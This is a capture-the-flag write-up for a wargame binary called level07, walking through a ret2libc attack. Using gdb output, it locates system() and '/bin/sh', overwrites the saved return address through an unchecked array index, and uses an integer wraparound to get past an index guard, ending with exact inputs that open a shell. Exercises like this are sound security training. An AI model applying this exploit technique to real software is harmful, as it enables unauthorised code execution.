### step 1: Decompile with Ghidra

We get the c source code of the program  

### step 2: Code analysis

This program appears to be a simple command-line interface for storing, reading, and managing numbers in an array-like data storage :

- The program defines functions for storing, reading, and managing numbers in an integer array.
- It reads user commands (store, read, quit) and performs corresponding actions.
- The main loop repeatedly prompts the user for commands, executes them, and provides feedback.
- The program continues until the user decides to quit or an internal error occurs.
- We cannot use the env for the exploit because it is cleared at the beginning of the `main` function
- As a result we will try to find a `/bin/sh` occurence and overflow the number storage to gain our flag


### step 3: Find occurence of /bin/sh

```
(gdb) break main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) print &system  
$2 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
(gdb) find &system,+9999999,"/bin/sh" 
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) 
```

As a result we have :
system address : `0xf7e6aed0`
bin/sh address : `0xf7f897ec`

### step 4: Find EIP of main function

```
(gdb) b main
Note: breakpoint 1 also set at pc 0x8048729.
Breakpoint 3 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 
Breakpoint 1, 0x08048729 in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args: 
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebp at 0xffffd708, eip at 0xffffd70c
(gdb) 
```

=> The eip address of the `main` function is `0xffffd70c`

### step 5: Find address of tab[100]

```
gdb
start 
disas main 

   0x080488df <+444>:   test   %eax,%eax
   0x080488e1 <+446>:   jne    0x80488f8 <main+469>
   0x080488e3 <+448>:   lea    0x24(%esp),%eax
   0x080488e7 <+452>:   mov    %eax,(%esp)
   0x080488ea <+455>:   call   0x8048630 <store_number>
   0x080488ef <+460>:   mov    %eax,0x1b4(%esp)
   0x080488f6 <+467>:   jmp    0x8048965 <main+578>
   0x080488f8 <+469>:   lea    0x1b8(%esp),%eax
   0x080488ff <+476>:   mov    %eax,%edx
   0x08048901 <+478>:   mov    $0x8048d61,%eax
   0x08048906 <+483>:   mov    $0x4,%ecx
   0x0804890b <+488>:   mov    %edx,%esi

   b*0x080488ea
   r
   x $eax
=> 0xffffd544:     0x00000000
```

=> The address of the tab[100] begining is `0xffffd544`

### step 6: Calculate tab index to overwrite

The interval between eip and tab is :
0xffffd70c - 0xffffd544 = 0x9E8 = 456 / 4 = 114
We divide the interval by 4 because it is an index of int which are 4 bytes long

### step 7 : Set sellcode to eip + 8 bytes

The shellcode address `0xf7f897ec`as an int is 4160264172
We set this address to the index 116 (eip + 8 bytes / 4)

```
insruction : store
number : 4160264172
index : 116
```

### step 8 : Set system address to eip

The system address `0xf7e6aed0` as an int is 4159090384

```
insruction : store
number : 4159090384
index : 114
```

However, we have a final issue. 114 can be divided by 3 so we can't write a number at the index 114 because we have this protection :
```
if ((input_index % 3 == 0) || (input_nbr >> 0x18 == 0xb7)) {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    res = 1;
}
```

### step 9 : Use the UINTMAX overflow for the final exploit

To write a number at the index 114 even if 114 can be divided by three and therefore is protected we use the UINTMAX overflow :

114 * 4 = 456 bytes
(UINTMAX + 1) + 456 = 456
(4294967295 + 1 + 456) / 4 = 1073741938

As a conclusion, here is our second input :

```
insruction : store
number : 4159090384
index : 1073741938
```

Then we quit and we get a shell !

### step 10 : Final exploit

Here are the two inputs :

```
insruction : store
number : 4160264172
index : 116
```

```
insruction : store
number : 4159090384
index : 1073741938
```
Then we quit and we get a shell !


### Ressources :

https://stackoverflow.com/questions/19124095/return-to-lib-c-buffer-overflow-exercise-issue